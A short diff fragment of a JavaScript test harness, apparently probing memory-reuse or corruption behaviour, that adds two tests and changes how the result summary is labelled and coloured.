+    ['DRP_drop_refs',  runDRP],
+    ['COR_corrupt',    runCOR]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -492,16 +515,18 @@ async function runAll() {
   }
 
   sep();
-  log('SUMMARY v22', 'inf');
+  log('SUMMARY v23', 'inf');
   sep();
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    var v = r.found !== undefined ? r.found :
+    var v = r.finFired !== undefined ? r.finFired :
+            r.collected !== undefined ? r.collected :
+            r.reused !== undefined ? r.reused :
             r.corruptConfirmed !== undefined ? r.corruptConfirmed : '?';
-    var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
+    var cls = v === true ? 'bad' : 'dim';
     log('  ' + k + ': key=' + v, cls);
   }
   sep();
